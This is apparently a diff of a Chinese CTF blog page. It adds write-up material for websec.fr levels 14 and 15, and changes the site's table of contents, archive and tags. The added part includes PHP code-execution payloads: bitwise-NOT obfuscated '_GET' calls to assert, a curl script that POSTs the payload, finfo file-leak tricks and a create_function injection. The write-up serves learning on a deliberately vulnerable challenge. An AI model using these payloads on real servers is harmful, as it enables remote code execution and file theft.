 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ht@TIANJI:~/temp$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; 'system'('ls');</span><br><span class="line">1.php</span><br><span class="line">php &gt; $a = ['1','system'];</span><br><span class="line">php &gt; echo $a&#123;1&#125;;</span><br><span class="line">system</span><br><span class="line">php &gt; $a&#123;1&#125;('ls');</span><br><span class="line">1.php</span><br></pre></td></tr></table></figure>
 <p>执行<code>phpinfo()</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist&#123;562&#125;();</span><br></pre></td></tr></table></figure>
+<p>根据爬去的方法名中可以找到如下几个方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">finfo_open</span><br><span class="line">finfo_close</span><br><span class="line">finfo_set_flags</span><br><span class="line">finfo_file</span><br></pre></td></tr></table></figure>
+<p>说明开启了php_fileinfo扩展。</p>
+<p>从而可以得到payload:</p>
+<p>需要开启错误显示:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(new finfo(6,&apos;/&apos;));</span><br><span class="line"></span><br><span class="line">这个也行：</span><br><span class="line">new finfo(0,&apos;/&apos;);</span><br></pre></td></tr></table></figure>
+<p>payload集锦:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = ~&apos;_GET&apos;;</span><br><span class="line">$payloadToSend = &apos;$a=$&#123;~&apos;. $payload .&apos;&#125;;$a&#123;0&#125;($a&#123;1&#125;);&apos;;</span><br><span class="line"></span><br><span class="line">$ch = curl_init(&apos;http://websec.fr/level14/index.php?0=assert&amp;1=var_dump(file_get_contents(\&apos;0e7efcd6e821f4bb90af4e4c439001944c1769da.php\&apos;))&apos;);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, 1);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, array(</span><br><span class="line">    &apos;code&apos; =&gt; $payloadToSend,</span><br><span class="line">));</span><br><span class="line">echo curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Using finfo to read files but &quot;.&quot; is blacklisted...</span><br><span class="line"></span><br><span class="line">PHP takes binary operations like a|b will be considered as &apos;c&apos;</span><br><span class="line"></span><br><span class="line">So trying to craft a &quot;.&quot; with &apos;&amp;&apos; | &apos;,&apos;</span><br><span class="line"></span><br><span class="line">We can now send code=new finfo(1,(&apos;&amp;&apos;|&apos;,&apos;)); and we get an error of finfo but with the content of every files in the directory.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://websec.fr/level14/index.php?a=assert&amp;b=var_dump(scandir(&apos;.&apos;))</span><br><span class="line">http://websec.fr/level14/index.php?a=assert&amp;b=readfile(&apos;0e7efcd6e821f4bb90af4e4c439001944c1769da.php&apos;)</span><br><span class="line"></span><br><span class="line">code=$&#123;~%a0%b8%ba%ab&#125;&#123;a&#125;($&#123;~%a0%b8%ba%ab&#125;&#123;b&#125;);</span><br></pre></td></tr></table></figure>
 <h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="string">'on'</span>);</span><br><span class="line">ini_set(<span class="string">'error_reporting'</span>, E_ALL);</span><br><span class="line"></span><br><span class="line">$success = <span class="string">'</span></span><br><span class="line"><span class="string">&lt;div class="alert alert-success alert-dismissible" role="alert"&gt;</span></span><br><span class="line"><span class="string">    &lt;button type="button" class="close" data-dismiss="alert" aria-label="Close"&gt;&lt;span aria-hidden="true"&gt;&amp;times;&lt;/span&gt;&lt;/button&gt;</span></span><br><span class="line"><span class="string">    Function declared.</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">'c'</span>]) &amp;&amp; !<span class="keyword">empty</span> ($_POST[<span class="string">'c'</span>])) &#123;</span><br><span class="line">    $fun = create_function(<span class="string">'$flag'</span>, $_POST[<span class="string">'c'</span>]);</span><br><span class="line">    <span class="keyword">print</span>($success);</span><br><span class="line">    <span class="comment">//fun($flag);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q'</span>]) &amp;&amp; $_POST[<span class="string">'q'</span>] == <span class="string">'checked'</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><code>create_function</code>参数可控，可以代码执行。</p>
 <p>payload: <code>echo 2;}echo $flag;/*</code></p>
@@ -726,7 +758,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#level1"><span class="toc-number">1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level2"><span class="toc-number">2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3"><span class="toc-number">3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level4"><span class="toc-number">4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level7"><span class="toc-number">5.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level8"><span class="toc-number">6.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level10"><span class="toc-number">7.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level11"><span class="toc-number">8.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level14未解决"><span class="toc-number">9.</span> <span class="toc-text">level14未解决</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level15"><span class="toc-number">10.</span> <span class="toc-text">level15</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level17"><span class="toc-number">11.</span> <span class="toc-text">level17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level18"><span class="toc-number">12.</span> <span class="toc-text">level18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level20"><span class="toc-number">13.</span> <span class="toc-text">level20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level22"><span class="toc-number">14.</span> <span class="toc-text">level22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level24"><span class="toc-number">15.</span> <span class="toc-text">level24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level25"><span class="toc-number">16.</span> <span class="toc-text">level25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level28"><span class="toc-number">17.</span> <span class="toc-text">level28</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#level1"><span class="toc-number">1.</span> <span class="toc-text">level1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level2"><span class="toc-number">2.</span> <span class="toc-text">level2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level3"><span class="toc-number">3.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level4"><span class="toc-number">4.</span> <span class="toc-text">level4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level7"><span class="toc-number">5.</span> <span class="toc-text">level7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level9"><span class="toc-number">6.</span> <span class="toc-text">level9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level8"><span class="toc-number">7.</span> <span class="toc-text">level8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level10"><span class="toc-number">8.</span> <span class="toc-text">level10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level11"><span class="toc-number">9.</span> <span class="toc-text">level11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level12"><span class="toc-number">10.</span> <span class="toc-text">level12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level14"><span class="toc-number">11.</span> <span class="toc-text">level14</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level15"><span class="toc-number">12.</span> <span class="toc-text">level15</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level17"><span class="toc-number">13.</span> <span class="toc-text">level17</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level18"><span class="toc-number">14.</span> <span class="toc-text">level18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level20"><span class="toc-number">15.</span> <span class="toc-text">level20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level22"><span class="toc-number">16.</span> <span class="toc-text">level22</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level24"><span class="toc-number">17.</span> <span class="toc-text">level24</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level25"><span class="toc-number">18.</span> <span class="toc-text">level25</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#level28"><span class="toc-number">19.</span> <span class="toc-text">level28</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1574,9 +1606,261 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 57
+        Total : 71
         </div>
         <!-- search  -->
         
@@ -1587,8 +1871,97 @@
     
     
     
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href="/posts/30918/">day-day-up</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/31116/">ctf题目-php调试分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/05</span><a class="archive-post-title" href="/posts/36891/">php7.2内核调试环境搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href="/posts/46756/">linux-优化实战笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/posts/41159/">RealWorldFinal</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href="/posts/4968/">pwnable.tw练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href="/posts/48844/">bctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/59263/">安全设备名词解释</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/28</span><a class="archive-post-title" href="/posts/23961/">安全域划分的相关问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/posts/16617/">code-breaking</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href="/posts/3376/">lctf-2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href="/posts/62306/">babystack-ret2dlsolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/posts/49484/">hctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href="/posts/59104/">SROP-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/19071/">tcache-study</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href="/posts/54250/">house_of_roman</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1598,11 +1971,6 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/30021/">hack-lu</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/posts/15111/">护网杯pwn-study</a>
         </li>
     
     
@@ -1622,7 +1990,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng9</a>
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href="/posts/45708/">anheng</a>
         </li>
     
     
@@ -1742,17 +2110,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">linux常见文件的作用</a>
         </li>
     
     
@@ -1797,12 +2160,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1822,7 +2185,7 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_return2plt</a>
         </li>
     
     
@@ -1880,19 +2243,25 @@
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
-        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+        <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
+        <span class="sidebar-tag-name" data-tags="置顶"><span class="iconfont-archer">&#xe606;</span>置顶</span>
+    
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -1904,9 +2273,9 @@
     
         <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
-        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
+        <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
     
-        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+        <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
